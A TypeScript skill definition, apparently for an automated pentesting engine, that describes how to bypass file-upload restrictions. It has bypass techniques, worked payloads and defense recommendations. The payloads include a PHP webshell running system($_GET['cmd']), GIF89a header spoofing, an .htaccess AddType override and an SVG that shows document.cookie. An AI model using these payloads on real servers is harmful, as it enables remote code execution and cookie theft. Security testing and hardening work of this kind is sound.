/**
 * HOS-Sec-Engine V2 - File Upload Bypass Skills
 * 文件上传限制绕过专项 Skill 集合
 */

import { AttackDefenseSkill } from '../../../types/skill';

export const uploadBypassSkills: AttackDefenseSkill[] = [
  {
    metadata: {
      id: 'web-upload-001',
      name: 'File Upload Restriction Bypass',
      category: 'web',
      subCategory: 'file-upload',
      riskLevel: 'critical',
      confidence: 0.93,
      updatedAt: '2026-06',
      author: 'HOS-Sec-Engine',
      tags: ['upload', 'bypass', 'file-type', 'extension', 'mime', 'rce'],
    },
    trigger: {
      scenarios: [
        '应用提供文件上传功能（头像、文档、图片、附件等）',
        '上传功能对文件类型进行限制（扩展名白名单/黑名单、MIME 类型检查）',
        '上传的文件存储在 Web 可访问目录',
        '无法直接上传 .php/.jsp/.aspx 等可执行文件',
        '上传后文件被重命名或移动到其他目录',
      ],
      keywords: [
        '文件上传',
        'upload',
        'file upload',
        '绕过',
        'bypass',
        '扩展名过滤',
        '文件类型限制',
        'mime type',
        'content-type',
        'whitelist',
        '黑名单',
        '头像上传',
        '附件上传',
      ],
      aliases: [
        'upload bypass',
        'file type restriction',
        'extension filter',
        'mime check bypass',
        'magic bytes bypass',
        '文件解析漏洞',
        '上传漏洞',
        'webshell上传',
      ],
      indicators: [
        'upload',
        'file type not allowed',
        'invalid file extension',
        'unsupported file type',
        'forbidden file type',
      ],
    },
    knowledge: {
      description:
        '文件上传限制绕过技术用于在目标系统对上传文件实施扩展名过滤、MIME 类型检查、内容检测等安全措施时，通过伪造文件头、利用解析差异、上传特殊配置文件等方式绕过限制并上传可执行文件。核心原理是找到应用层验证逻辑与服务器解析逻辑之间的差异。',
      symptoms: [
        '上传 .php/.jsp 文件时提示 "不允许的文件类型"',
        '前端或后端对文件扩展名进行白名单/黑名单过滤',
        'MIME 类型检查拦截非图片/文档类型',
        '文件内容检查（magic bytes）验证文件头',
        '上传成功后文件无法通过 URL 直接访问',
      ],
      rootCauses: [
        '扩展名白名单不完整（如允许 .phtml/.php3/.php5 等 PHP 变体扩展名）',
        '服务器配置支持多扩展名解析（如 file.php.jpg 被 Apache 解析为 PHP）',
        'MIME 类型检查仅依赖 Content-Type 请求头，可被伪造',
        '内容检测只验证文件头 magic bytes，不检查文件内容',
        '文件名处理逻辑存在截断/覆盖漏洞（如 Null 字节截断）',
        '解析器配置错误（如 .htaccess 上传后修改解析规则）',
        '第三方库解析漏洞（如图片处理库的缓冲区溢出）',
      ],
      observations: [
        'Apache 解析规则：从左到右识别扩展名，file.php.xxx 会尝试解析 PHP',
        'IIS 6.0 支持目录解析 /xxx.asp/ 和分号解析 file.asp;.jpg',
        'Nginx 配置错误时可导致任意文件解析为 PHP（fastcgi_split_path_info）',
        'PHP-FPM 配置中 fix_pathinfo=1 会导致路径信息被错误解析',
        '部分 WAF 只检测请求体，对 multipart/form-data 的 boundary 处理不完善',
        'SVG 文件可包含 JavaScript 代码，在某些场景下可执行',
      ],
      commonMistakes: [
        '只尝试修改扩展名，忽略 MIME 类型也需要匹配',
        '未验证服务器实际解析规则就盲目上传',
        '忽略文件内容检查，直接上传纯代码文件',
        '未考虑文件存储路径和 URL 映射关系',
        '过度依赖自动化工具，忽略手动分析验证逻辑',
      ],
      notes: [
        '不同 Web 服务器（Apache/Nginx/IIS）解析规则差异很大',
        '部分绕过技术依赖特定服务器版本或配置',
        '上传漏洞利用需要结合存储路径和访问 URL 分析',
        '现代上传组件通常结合多种验证方式，需要综合绕过',
      ],
    },
    action: {
      checklist: [
        '确认上传功能入口和参数（表单字段、API 端点）',
        '识别验证层（前端 JS、后端代码、WAF、代理）',
        '分析扩展名验证方式（白名单/黑名单/正则）',
        '分析 MIME 类型验证方式（Content-Type 头检查）',
        '分析内容验证方式（magic bytes、图片尺寸、文件头）',
        '确认文件存储路径和 URL 映射关系',
        '确认服务器类型和版本（Apache/Nginx/IIS/其他）',
        '尝试扩展名绕过（变体扩展名、双扩展名、大小写）',
        '尝试 MIME 类型伪造（修改 Content-Type 头）',
        '尝试文件头伪造（添加 magic bytes 前缀）',
        '尝试特殊文件上传（.htaccess、web.config、.user.ini）',
        '验证上传文件是否可通过 URL 访问和执行',
      ],
      techniques: [
        '扩展名变体绕过：.php → .phtml, .php3, .php5, .php7, .pht',
        '双扩展名绕过：file.php.jpg → Apache 可能解析为 PHP',
        '大小写绕过：.PhP, .PHP, .pHp（Windows 不区分大小写）',
        'MIME 类型伪造：Content-Type: image/jpeg 配合 PHP 代码',
        '文件头伪造：GIF89a + PHP 代码（伪造 GIF 文件头）',
        '图片马：合法图片中插入 PHP 代码（copy normal.jpg /b + shell.php /a webshell.jpg）',
        '.htaccess 上传：AddType application/x-httpd-php .jpg',
        'Null 字节截断：file.php%00.jpg（PHP < 5.3.4）',
        '空格/点号截断：file.php. 或 file.php （Windows 特性）',
        'SVG XSS：SVG 文件中包含 <script> 标签',
        'ZIP/TAR 解压上传：上传压缩包，服务端解压后获取可执行文件',
        '文件覆盖：上传同名文件覆盖现有可执行文件',
      ],
      examples: [
        {
          name: 'GIF 文件头 + PHP 代码绕过',
          description: '伪造 GIF 文件头绕过内容检测，同时包含可执行 PHP 代码',
          content:
            "原始文件: <?php system($_GET['cmd']); ?>\n" +
            "绕过文件:\n" +
            "GIF89a\n" +
            "<?php system($_GET['cmd']); ?>\n" +
            "原理: 服务器检查文件头 magic bytes 是否为 GIF89a，而 PHP 解释器从 <?php 开始执行\n" +
            "     文件同时满足图片格式检查和服务端执行条件\n" +
            "适用: 仅检查文件头 magic bytes 的场景",
        },
        {
          name: '双扩展名 Apache 解析绕过',
          description: '利用 Apache 从左到右解析扩展名的特性，使用双扩展名绕过白名单',
          content:
            "原始请求: 上传 shell.php → 被拦截（.php 不在白名单）\n" +
            "绕过请求: 上传 shell.php.jpg → 存储为 shell.php.jpg\n" +
            "Apache 配置: AddType application/x-httpd-php .php\n" +
            "访问 URL: http://target/uploads/shell.php.jpg\n" +
            "原理: Apache 从左到右检查扩展名，发现 .php 后按 PHP 执行\n" +
            "     注意：需要 Apache 未配置 Strict 模式，且 .jpg 在白名单中\n" +
            "适用: Apache 服务器，扩展名白名单包含图片类型",
        },
        {
          name: '.htaccess 配置上传',
          description: '上传 .htaccess 文件修改目录解析规则，使普通文件按 PHP 执行',
          content:
            "上传文件: .htaccess\n" +
            "文件内容: AddType application/x-httpd-php .jpg\n" +
            "或: <FilesMatch \"shell.jpg\">\n" +
            "      SetHandler application/x-httpd-php\n" +
            "    </FilesMatch>\n" +
            "然后上传: shell.jpg（包含 PHP 代码）\n" +
            "访问 URL: http://target/uploads/shell.jpg\n" +
            "原理: .htaccess 会覆盖 Apache 目录级配置，修改文件类型映射\n" +
            "     需要服务器允许 .htaccess 覆盖（AllowOverride All）\n" +
            "适用: Apache 服务器，AllowOverride 配置宽松",
        },
        {
          name: 'SVG 文件 XSS 绕过',
          description: '上传包含 JavaScript 的 SVG 文件，在其他用户访问时触发 XSS',
          content:
            "上传文件: payload.svg\n" +
            "文件内容:\n" +
            "<?xml version=\"1.0\" standalone=\"no\"?>\n" +
            "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n" +
            "<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
            "  <script type=\"text/javascript\">\n" +
            "    alert(document.cookie);\n" +
            "  </script>\n" +
            "  <circle cx=\"50\" cy=\"50\" r=\"40\" fill=\"red\" />\n" +
            "</svg>\n" +
            "原理: SVG 是 XML 格式的图片文件，可包含 <script> 标签\n" +
            "     在浏览器中直接访问 SVG URL 时会执行其中的 JavaScript\n" +
            "适用: 允许上传 SVG 文件的场景（如图标、矢量图上传）",
        },
        {
          name: 'MIME 类型伪造 + 扩展名绕过组合',
          description: '同时修改扩展名和 MIME 类型，绕过双重验证',
          content:
            "原始请求:\n" +
            "  文件名: shell.php\n" +
            "  Content-Type: application/x-php\n" +
            "  结果: 被拦截（扩展名和 MIME 都被检测）\n" +
            "绕过请求:\n" +
            "  文件名: shell.phtml\n" +
            "  Content-Type: image/jpeg\n" +
            "  文件内容: GIF89a + PHP 代码\n" +
            "  结果: 通过验证（.phtml 可能被遗漏，MIME 伪造为图片）\n" +
            "原理: 组合多种绕过技术，同时满足扩展名和 MIME 类型检查\n" +
            "适用: 同时检查扩展名和 MIME 类型的场景",
        },
      ],
    },
    validation: {
      indicators: [
        '文件上传成功且返回存储路径',
        '上传文件可通过 URL 直接访问',
        '访问上传文件时返回 HTTP 200 状态码',
        '访问上传文件时服务器执行其中的代码（如 PHP）',
        '文件内容检查未拦截（文件大小、类型与实际内容匹配）',
      ],
      successSigns: [
        '上传响应包含文件路径或 URL',
        '访问上传文件 URL 返回预期内容',
        'PHP 代码执行成功（如 phpinfo() 输出、命令执行结果）',
        'XSS payload 在浏览器中触发（弹窗、Cookie 输出）',
        '服务器返回执行结果而非静态文件内容',
      ],
      falsePositiveSigns: [
        '文件可访问但代码未执行（仅作为静态文件返回）',
        '上传成功但文件存储在不可访问目录',
        '文件被重命名导致无法预测 URL',
        '服务器配置严格，所有变体扩展名都被拦截',
      ],
    },
    defense: {
      recommendations: [
        '使用白名单严格限制允许的扩展名（仅 .jpg/.png/.pdf 等安全类型）',
        '不要依赖 MIME 类型验证（可被伪造），应检查文件内容',
        '使用安全的文件存储路径（非 Web 可访问目录，或通过控制器访问）',
        '上传文件重命名为随机 UUID，消除扩展名解析风险',
        '配置 Web 服务器禁止上传目录的执行权限',
        '对图片文件进行重新编码/压缩处理，清除恶意内容',
        '实施文件大小限制，防止资源耗尽攻击',
        '使用防病毒扫描引擎检查上传文件',
      ],
      mitigations: [
        '配置 Nginx/Apache 禁止上传目录的脚本执行权限',
        '使用对象存储（如 S3/OSS）存储上传文件，隔离执行环境',
        '实施内容安全策略（CSP），限制脚本执行来源',
        '定期审计文件上传功能的验证逻辑',
        '监控上传目录的异常文件访问模式',
      ],
      references: [
        'https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload',
        'https://portswigger.net/web-security/file-upload',
        'https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html',
        'https://book.hacktricks.xyz/pentesting-web/file-upload',
      ],
    },
    quality: {
      confidence: 0.93,
      reviewed: true,
      tested: true,
      lastVerified: '2026-06',
    },
    playbooks: ['web-pentest-full'],
    phase: 'exploitation',
    enabled: true,
    runtime: {
      requiresAgent: false,
      agentCount: 1,
      parallelizable: true,
      requiresNetwork: true,
      requiresSandbox: false,
      dependencies: [],
      estimatedTokens: 3500,
    },
  },
];
